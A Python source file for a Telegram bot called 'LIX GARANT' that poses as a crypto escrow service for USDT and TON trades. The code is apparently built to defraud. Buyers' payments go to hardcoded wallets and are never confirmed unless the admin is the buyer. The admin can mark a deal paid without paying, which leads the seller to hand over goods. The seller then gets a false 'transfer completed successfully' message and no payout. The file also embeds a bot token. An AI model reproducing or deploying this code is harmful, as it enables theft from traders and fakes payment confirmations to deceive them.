import os
import random
import string
from datetime import datetime, timedelta
from typing import Dict, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    ReplyKeyboardRemove,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder

# Конфигурация бота (сделайте лайкос скату за старания)
BOT_TOKEN = "8100386831:AAEZeH7H7AD4Uf7Qy5tn6QftJzVFJOJszWk"
ADMIN_ID = 1799193124

# Адреса кошельков по умолчанию
DEFAULT_USDT_ADDRESS = "TAhBztSwHh1juGPJZKXdPXaPm36pne6bvy"
DEFAULT_TON_ADDRESS = "UQACM6Jzmwt5yYXSuzonLjqqUzq7d_FfkOqYplYyrAiws0Y2"

# Хранение данных о сделках
active_deals: Dict[str, Dict] = {}  # {deal_code: deal_info}
user_deals: Dict[int, str] = {}  # {user_id: deal_code}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class Form(StatesGroup):
    selecting_action = State()
    creating_deal = State()
    choosing_currency = State()
    entering_amount = State()
    entering_code = State()
    deal_in_progress = State()
    completing_deal = State()
    entering_wallet = State()
    confirming_exit = State()

def generate_deal_code() -> str:
    """Генерация 20-значного кода сделки"""
    characters = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(characters) for _ in range(20))

async def get_main_keyboard():
    """Клавиатура главного меню"""
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="Я покупатель", callback_data="create_deal"),
        InlineKeyboardButton(text="Я продавец", callback_data="enter_code"),
    )
    builder.adjust(1)
    return builder.as_markup()

async def get_deal_keyboard(deal_code: str):
    """Клавиатура для участников сделки"""
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="❌ Выйти из сделки", callback_data=f"exit_deal:{deal_code}"),
    )
    builder.adjust(1)
    return builder.as_markup()

async def get_exit_confirmation_keyboard(deal_code: str):
    """Клавиатура подтверждения выхода из сделки"""
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="✅ Да, выйти", callback_data=f"confirm_exit:{deal_code}"),
        InlineKeyboardButton(text="❌ Нет, остаться", callback_data=f"cancel_exit:{deal_code}"),
    )
    builder.adjust(2)
    return builder.as_markup()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    """Обработка команды /start"""
    await state.set_state(Form.selecting_action)
    await message.answer(
        f"👋 Привет, {message.from_user.first_name}!\n"
        "Я - LIX GARANT, ваш надежный гарант для безопасных сделок.\n"
        "Выберите действие:",
        reply_markup=await get_main_keyboard(),
    )

@dp.callback_query(F.data == "create_deal")
async def create_deal(callback: types.CallbackQuery, state: FSMContext):
    """Начало создания сделки"""
    await state.set_state(Form.choosing_currency)
    
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="USDT", callback_data="usdt"),
        InlineKeyboardButton(text="TON", callback_data="ton"),
    )
    builder.adjust(2)
    
    await callback.message.edit_text(
        "🔹 Выберите криптовалюту для сделки:",
        reply_markup=builder.as_markup(),
    )

@dp.callback_query(F.data.in_(["usdt", "ton"]))
async def choose_currency(callback: types.CallbackQuery, state: FSMContext):
    """Обработка выбора валюты"""
    await state.update_data(currency=callback.data)
    await state.set_state(Form.entering_amount)
    await callback.message.edit_text(f" Введите сумму сделки в {callback.data.upper()}:")

@dp.message(Form.entering_amount)
async def process_amount(message: types.Message, state: FSMContext):
    """Обработка ввода суммы сделки"""
    try:
        amount = float(message.text)
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer(" Неверная сумма. Пожалуйста, введите положительное число:")
        return
    
    data = await state.get_data()
    currency = data.get("currency")
    deal_code = generate_deal_code()
    expires_at = datetime.now() + timedelta(minutes=10)
    
    # Определяем адрес кошелька
    wallet_address = DEFAULT_USDT_ADDRESS if currency == "usdt" else DEFAULT_TON_ADDRESS
    if message.from_user.id == ADMIN_ID:
        wallet_address = "Администраторский кошелек"
    
    # Сохраняем сделку
    active_deals[deal_code] = {
        "buyer_id": message.from_user.id,
        "seller_id": None,
        "currency": currency,
        "amount": amount,
        "created_at": datetime.now(),
        "expires_at": expires_at,
        "status": "created",
        "buyer_paid": False,
        "seller_confirmed": False,
        "buyer_confirmed": False,
        "wallet_address": wallet_address,
    }
    
    user_deals[message.from_user.id] = deal_code
    
    # Форматируем время окончания
    expires_time = expires_at.strftime("%H:%M:%S")
    
    await message.answer(
        f" Сделка создана!\n\n"
        f"💵 Сумма: {amount} {currency.upper()}\n"
        f"🔑 Код сделки: <code>{deal_code}</code>\n"
        f"⏳ Код действителен до: {expires_time}\n\n"
        f" Передайте этот код продавцу. После ввода кода сделка начнется автоматически.",
        parse_mode="HTML",
        reply_markup=await get_main_keyboard(),
    )
    await state.set_state(Form.selecting_action)

@dp.callback_query(F.data == "enter_code")
async def enter_deal_code(callback: types.CallbackQuery, state: FSMContext):
    """Запрос кода сделки"""
    await state.set_state(Form.entering_code)
    await callback.message.edit_text(" Введите код сделки:")

@dp.message(Form.entering_code)
async def process_deal_code(message: types.Message, state: FSMContext):
    """Обработка введенного кода сделки"""
    deal_code = message.text.strip()
    
    if deal_code not in active_deals:
        await message.answer("❌ Код сделки не найден или истек. Пожалуйста, проверьте код и попробуйте еще раз:")
        return
    
    deal = active_deals[deal_code]
    
    if deal["status"] != "created":
        await message.answer("❌ Эта сделка уже начата или завершена.")
        await state.set_state(Form.selecting_action)
        return
    
    # Проверка, что пользователь не пытается создать сделку с самим собой
    if deal["buyer_id"] == message.from_user.id:
        await message.answer("❌ Вы не можете быть одновременно покупателем и продавцом в одной сделке.")
        await state.set_state(Form.selecting_action)
        return
    
    # Продавец присоединяется к сделке
    deal["seller_id"] = message.from_user.id
    deal["status"] = "in_progress"
    user_deals[message.from_user.id] = deal_code
    
    # Уведомляем стороны
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    # Сообщение продавцу
    await message.answer(
        f" Вы присоединились к сделке!\n\n"
        f"💵 Сумма: {amount} {currency}\n"
        f"🔹 Сейчас покупатель переведёт {amount} {currency} на наш адрес, мы сообщим когда получим платёж!",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    
    # Сообщение покупателю
    builder = InlineKeyboardBuilder()
    if message.from_user.id == ADMIN_ID:
        builder.add(InlineKeyboardButton(text="✅ Оплатил", callback_data=f"deal_paid:{deal_code}"))
    else:
        builder.add(InlineKeyboardButton(text="✅ Оплатил", callback_data=f"not_admin_payment"))
    builder.add(InlineKeyboardButton(
        text="❌ Выйти из сделки", 
        callback_data=f"exit_deal:{deal_code}"
    ))
    
    await bot.send_message(
        chat_id=deal["buyer_id"],
        text=f"🔹 Продавец присоединился к сделке!\n\n"
             f"💵 Сумма: {amount} {currency}\n"
             f"🏦 Адрес для оплаты: <code>{deal['wallet_address']}</code>\n\n"
             f"🔹 После перевода средств нажмите кнопку ниже:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
    )
    
    await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data == "not_admin_payment")
async def not_admin_payment(callback: types.CallbackQuery):
    """Обработка попытки оплаты не админом"""
    await callback.answer("⏳ Оплата еще не поступила. Пожалуйста, подождите подтверждения от гаранта.", show_alert=True)

@dp.callback_query(F.data.startswith("deal_paid:"))
async def confirm_payment(callback: types.CallbackQuery, state: FSMContext):
    """Покупатель (админ) подтверждает оплату"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id != deal["buyer_id"]:
        await callback.answer("❌ Ошибка: вы не являетесь покупателем в этой сделке.")
        return
    
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Только администратор может подтверждать оплату.")
        return
    
    deal["buyer_paid"] = True
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    # Уведомляем продавца
    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(
        text="✅ Подтвердить выполнение", 
        callback_data=f"deal_complete:{deal_code}"
    ))
    builder.add(InlineKeyboardButton(
        text="❌ Выйти из сделки", 
        callback_data=f"exit_deal:{deal_code}"
    ))
    
    await bot.send_message(
        chat_id=deal["seller_id"],
        text=f"✅ Покупатель отправил {amount} {currency}, теперь вам нужно передать цифровой товар. "
             f"После передачи товара вам нужно нажать на кнопку «Подтвердить выполнение»",
        reply_markup=builder.as_markup(),
    )
    
    await callback.message.edit_text(
        " Вы подтвердили оплату. Ожидайте подтверждения передачи товара от продавца.",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data.startswith("deal_complete:"))
async def confirm_completion(callback: types.CallbackQuery, state: FSMContext):
    """Продавец подтверждает передачу товара"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id != deal["seller_id"]:
        await callback.answer("❌ Ошибка: вы не являетесь продавцом в этой сделке.")
        return
    
    deal["seller_confirmed"] = True
    
    if deal["buyer_confirmed"]:
        # Обе стороны подтвердили - завершаем сделку
        await complete_deal(deal_code, state)
    else:
        # Ждем подтверждения от покупателя
        builder = InlineKeyboardBuilder()
        builder.add(InlineKeyboardButton(
            text="✅ Подтвердить получение", 
            callback_data=f"deal_confirm:{deal_code}"
        ))
        builder.add(InlineKeyboardButton(
            text="❌ Выйти из сделки", 
            callback_data=f"exit_deal:{deal_code}"
        ))
        
        await bot.send_message(
            chat_id=deal["buyer_id"],
            text=f" Продавец подтвердил передачу товара. Пожалуйста, подтвердите получение:",
            reply_markup=builder.as_markup(),
        )
        
        await callback.message.edit_text(
            " Вы подтвердили передачу товара. Ожидайте подтверждения от покупателя.",
            reply_markup=await get_deal_keyboard(deal_code),
        )
    
    await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data.startswith("deal_confirm:"))
async def confirm_receipt(callback: types.CallbackQuery, state: FSMContext):
    """Покупатель подтверждает получение товара"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id != deal["buyer_id"]:
        await callback.answer("❌ Ошибка: вы не являетесь покупателем в этой сделке.")
        return
    
    deal["buyer_confirmed"] = True
    
    if deal["seller_confirmed"]:
        # Обе стороны подтвердили - завершаем сделку
        await complete_deal(deal_code, state)
    else:
        await callback.message.edit_text(
            " Вы подтвердили получение товара. Ожидайте подтверждения от продавца.",
            reply_markup=await get_deal_keyboard(deal_code),
        )
    
    await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data.startswith("exit_deal:"))
async def request_exit_deal(callback: types.CallbackQuery, state: FSMContext):
    """Запрос на выход из сделки"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id not in [deal["buyer_id"], deal["seller_id"]]:
        await callback.answer("❌ Ошибка: вы не являетесь участником этой сделки.")
        return
    
    await state.set_state(Form.confirming_exit)
    await state.update_data(exit_deal_code=deal_code)
    
    await callback.message.edit_text(
        "⚠️ Вы уверены, что хотите выйти из сделки?",
        reply_markup=await get_exit_confirmation_keyboard(deal_code),
    )

@dp.callback_query(F.data.startswith("confirm_exit:"))
async def confirm_exit_deal(callback: types.CallbackQuery, state: FSMContext):
    """Подтверждение выхода из сделки"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id not in [deal["buyer_id"], deal["seller_id"]]:
        await callback.answer("❌ Ошибка: вы не являетесь участником этой сделки.")
        return
    
    user_id = callback.from_user.id
    other_user_id = deal["buyer_id"] if user_id == deal["seller_id"] else deal["seller_id"]
    
    # Удаляем сделку
    del active_deals[deal_code]
    if deal["buyer_id"] in user_deals:
        del user_deals[deal["buyer_id"]]
    if deal["seller_id"] in user_deals:
        del user_deals[deal["seller_id"]]
    
    # Уведомляем другого участника
    await bot.send_message(
        chat_id=other_user_id,
        text=f"❌ Другой участник вышел из сделки. Сделка отменена.",
        reply_markup=await get_main_keyboard(),
    )
    
    await callback.message.edit_text(
        "❌ Вы вышли из сделки.",
        reply_markup=await get_main_keyboard(),
    )
    
    await state.set_state(Form.selecting_action)

@dp.callback_query(F.data.startswith("cancel_exit:"))
async def cancel_exit_deal(callback: types.CallbackQuery, state: FSMContext):
    """Отмена выхода из сделки"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id not in [deal["buyer_id"], deal["seller_id"]]:
        await callback.answer("❌ Ошибка: вы не являетесь участником этой сделки.")
        return
    
    await callback.message.edit_text(
        "✅ Вы остаетесь в сделке.",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    
    await state.set_state(Form.deal_in_progress)

async def complete_deal(deal_code: str, state: FSMContext):
    """Завершение сделки"""
    deal = active_deals[deal_code]
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    # Уведомляем покупателя
    await bot.send_message(
        chat_id=deal["buyer_id"],
        text=f"Сделка успешно завершена! Товар передан, средства будут отправлены продавцу.",
        reply_markup=await get_main_keyboard(),
    )
    
    # Запрашиваем у продавца адрес для выплаты
    await state.set_state(Form.entering_wallet)
    await state.update_data(complete_deal_code=deal_code)
    
    await bot.send_message(
        chat_id=deal["seller_id"],
        text=f" Сделка успешно завершена! Пожалуйста, введите адрес кошелька {currency} для получения {amount} {currency}:",
    )

@dp.message(Form.entering_wallet)
async def process_wallet_address(message: types.Message, state: FSMContext):
    """Обработка адреса кошелька для выплаты"""
    data = await state.get_data()
    deal_code = data.get("complete_deal_code")
    deal = active_deals.get(deal_code)
    
    if not deal or message.from_user.id != deal["seller_id"]:
        await message.answer("❌ Ошибка: сделка не найдена.")
        await state.set_state(Form.selecting_action)
        return
    
    wallet_address = message.text.strip()
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    # Здесь должна быть реальная логика выплаты
    await message.answer(
        f"🔹 Средства в размере {amount} {currency} будут отправлены на адрес:\n"
        f"<code>{wallet_address}</code>\n\n"
        f"✅ Перевод выполнен успешно! Сделка завершена.",
        parse_mode="HTML",
        reply_markup=await get_main_keyboard(),
    )
    
    # Уведомляем покупателя
    await bot.send_message(
        chat_id=deal["buyer_id"],
        text=f" Продавец получил свои средства. Сделка полностью завершена!",
        reply_markup=await get_main_keyboard(),
    )
    
    # Удаляем сделку
    del active_deals[deal_code]
    if deal["buyer_id"] in user_deals:
        del user_deals[deal["buyer_id"]]
    if deal["seller_id"] in user_deals:
        del user_deals[deal["seller_id"]]
    
    await state.set_state(Form.selecting_action)

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    """Отмена текущего действия"""
    await state.set_state(Form.selecting_action)
    await message.answer(
        "Действие отменено.",
        reply_markup=await get_main_keyboard(),
    )

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())